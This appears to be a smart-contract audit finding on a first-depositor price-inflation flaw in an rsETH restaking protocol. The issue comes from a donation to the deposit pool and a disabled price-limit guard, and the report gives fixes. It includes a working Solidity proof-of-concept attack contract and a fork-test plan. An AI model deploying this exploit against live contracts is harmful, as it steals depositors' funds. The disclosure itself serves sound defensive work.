Audit Report

## Title
First-Depositor rsETH Price Inflation via ETH Donation and Disabled `pricePercentageLimit` Guard — (`contracts/LRTOracle.sol`, `contracts/LRTDepositPool.sol`)

## Summary
An unprivileged attacker acting as the first depositor can inflate `rsETHPrice` from `1e18` to approximately `1e36` by minting 1 wei rsETH, donating 1 ETH directly to the deposit pool via its open `receive()`, and calling the public `updateRSETHPrice()`. The price-increase guard is unconditionally bypassed because `pricePercentageLimit` defaults to `0` and is never set during initialization. After the manipulation, subsequent depositors receive near-zero or zero rsETH for their ETH, and the attacker's single wei of rsETH represents essentially all pool equity.

## Finding Description

**Step 1 — Bootstrap price to `1e18`.**
`updateRSETHPrice()` is `public whenNotPaused` with no role restriction. When `rsethSupply == 0`, it hard-codes `rsETHPrice = 1 ether` and returns immediately. [1](#0-0) [2](#0-1) 

**Step 2 — Mint 1 wei rsETH.**
`depositETH(0, "")` with `msg.value = 1 wei` passes `_beforeDeposit` because `minAmountToDeposit` defaults to `0` (never set in `initialize`). `getRsETHAmountToMint` computes `(1 * 1e18) / 1e18 = 1`, so 1 wei rsETH is minted. `rsethSupply` is now `1`. [3](#0-2) [4](#0-3) 

**Step 3 — Inflate `totalETHInProtocol` via direct donation.**
`LRTDepositPool` has an open `receive()` function. Sending 1 ETH directly raises `address(this).balance` to `~1e18`, which `getETHDistributionData` counts verbatim as `ethLyingInDepositPool`. [5](#0-4) [6](#0-5) 

**Step 4 — Call `updateRSETHPrice()` to set price to `~1e36`.**
With `rsethSupply = 1` and `totalETHInProtocol ≈ 1e18`, `divWad` computes `x.mulDiv(WAD, y)`:

```
newRsETHPrice = (1e18 + 1) * 1e18 / 1 ≈ 1e36
``` [7](#0-6) [8](#0-7) 

**Step 5 — Price-increase guard is a no-op.**
The guard that would revert a non-manager on an excessive price increase is gated by `pricePercentageLimit > 0`. Since `pricePercentageLimit` is a plain storage variable never set in `initialize` or `reinitialize`, it defaults to `0`, making `isPriceIncreaseOffLimit` permanently `false` until an admin explicitly calls `setPricePercentageLimit`. [9](#0-8) [10](#0-9) [11](#0-10) 

`rsETHPrice` and `highestRsethPrice` are both written to `~1e36`. [12](#0-11) [13](#0-12) 

## Impact Explanation

After the manipulation, every subsequent depositor calling `depositETH` or `depositAsset` receives:

```
rsethAmountToMint = (amount * assetPrice) / rsETHPrice
                  = (1e18 * 1e18) / 1e36
                  = 1   (for a full 1 ETH deposit)
```

Any deposit smaller than `rsETHPrice / assetPrice = 1e18` wei rounds to **0 rsETH**. The `_beforeDeposit` check only reverts if `rsethAmountToMint < minRSETHAmountExpected`; callers who pass `minRSETHAmountExpected = 0` silently lose their ETH with 0 rsETH minted. The attacker's 1 wei rsETH represents virtually 100% of pool equity, enabling them to drain all subsequently deposited ETH through the withdrawal path. This constitutes **Critical: direct theft of user funds** and **Critical: protocol insolvency**. [14](#0-13) 

## Likelihood Explanation

- No privileged role is required; `updateRSETHPrice()` and `depositETH()` are both callable by any EOA.
- `minAmountToDeposit` and `pricePercentageLimit` both default to `0`, so no admin action is needed to enable the attack.
- The attack is viable in the window between deployment and the admin calling `setPricePercentageLimit`, which has no deadline or enforcement.
- The cost is 1 ETH (the donation), which is recoverable once the attacker redeems their rsETH against the inflated pool.
- The attack is atomic and front-runnable against any legitimate first depositor.

## Recommendation

1. **Enforce a non-zero `pricePercentageLimit` at initialization.** Set a safe default (e.g., `1e16` = 1%) inside `initialize` so the guard is active from block 0.
2. **Seed the pool atomically during deployment.** Mint a meaningful initial rsETH supply (e.g., `1e15` wei) to a dead address so `rsethSupply` is never `1` in production.
3. **Reject direct ETH donations or exclude them from TVL.** Track only ETH received through controlled entry points (`depositETH`, `receiveFromNodeDelegator`, etc.) rather than using raw `address(this).balance`.
4. **Set `minAmountToDeposit` to a non-trivial value** (e.g., `0.001 ether`) at initialization to prevent dust deposits.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

interface ILRTOracle      { function updateRSETHPrice() external; function rsETHPrice() external view returns (uint256); }
interface ILRTDepositPool { function depositETH(uint256 min, string calldata ref) external payable; }

contract FirstDepositorPoC {
    ILRTOracle      oracle;
    ILRTDepositPool pool;

    constructor(address _oracle, address _pool) {
        oracle = ILRTOracle(_oracle);
        pool   = ILRTDepositPool(_pool);
    }

    function attack() external payable {
        // Step 1: bootstrap price (supply == 0 → rsETHPrice = 1e18)
        oracle.updateRSETHPrice();

        // Step 2: mint 1 wei rsETH (minAmountToDeposit == 0 by default)
        pool.depositETH{value: 1}(0, "");

        // Step 3: donate 1 ETH — counted verbatim via address(this).balance
        payable(address(pool)).transfer(1 ether);

        // Step 4: inflate price — pricePercentageLimit == 0 so guard is skipped
        oracle.updateRSETHPrice();

        // Assert: rsETHPrice is now ~1e36
        require(oracle.rsETHPrice() > 1e30, "attack failed");
    }

    // Victim deposits 1 ETH, receives only 1 wei rsETH (or 0 for smaller amounts)
    // victim.depositETH{value: 1 ether}(0, "");
    // rsethAmountToMint = (1e18 * 1e18) / 1e36 = 1 wei
}
```

Foundry fork test plan: deploy against a local Anvil fork with initialized contracts (ETH as supported asset, ETH price oracle set to `1e18`), run `attack()` with `msg.value = 1 ether + 1 wei`, assert `oracle.rsETHPrice() > 1e30`, then simulate a victim `depositETH{value: 0.5 ether}(0, "")` and assert the victim receives 0 rsETH while their ETH is accepted.

### Citations

**File:** contracts/LRTOracle.sol (L64-68)
```text
    function initialize(address lrtConfigAddr) external initializer {
        UtilLib.checkNonZeroAddress(lrtConfigAddr);
        lrtConfig = ILRTConfig(lrtConfigAddr);
        emit UpdatedLRTConfig(lrtConfigAddr);
    }
```

**File:** contracts/LRTOracle.sol (L72-79)
```text
    function reinitialize(uint256 _feePeriodStartTime) external reinitializer(2) onlyLRTManager {
        if (_feePeriodStartTime > block.timestamp || _feePeriodStartTime <= block.timestamp - 1 days) {
            revert PeriodStartTimeShouldBeWithin24Hours();
        }

        feePeriodStartTime = _feePeriodStartTime;
        emit FeePeriodStartTimeSet(_feePeriodStartTime);
    }
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L218-222)
```text
        if (rsethSupply == 0) {
            rsETHPrice = 1 ether;
            highestRsethPrice = 1 ether;
            return;
        }
```

**File:** contracts/LRTOracle.sol (L250-250)
```text
        uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
```

**File:** contracts/LRTOracle.sol (L256-257)
```text
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
```

**File:** contracts/LRTOracle.sol (L294-296)
```text
        if (newRsETHPrice > highestRsethPrice) {
            highestRsethPrice = newRsETHPrice;
        }
```

**File:** contracts/LRTOracle.sol (L313-313)
```text
        rsETHPrice = newRsETHPrice;
```

**File:** contracts/LRTDepositPool.sol (L58-58)
```text
    receive() external payable { }
```

**File:** contracts/LRTDepositPool.sol (L480-480)
```text
        ethLyingInDepositPool = address(this).balance;
```

**File:** contracts/LRTDepositPool.sol (L519-521)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/LRTDepositPool.sol (L657-659)
```text
        if (depositAmount == 0 || depositAmount < minAmountToDeposit) {
            revert InvalidAmountToDeposit();
        }
```

**File:** contracts/LRTDepositPool.sol (L665-669)
```text
        rsethAmountToMint = getRsETHAmountToMint(asset, depositAmount);

        if (rsethAmountToMint < minRSETHAmountExpected) {
            revert MinimumAmountToReceiveNotMet();
        }
```

**File:** contracts/utils/WadMath.sol (L25-27)
```text
    function divWad(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x.mulDiv(WAD, y);
    }
```
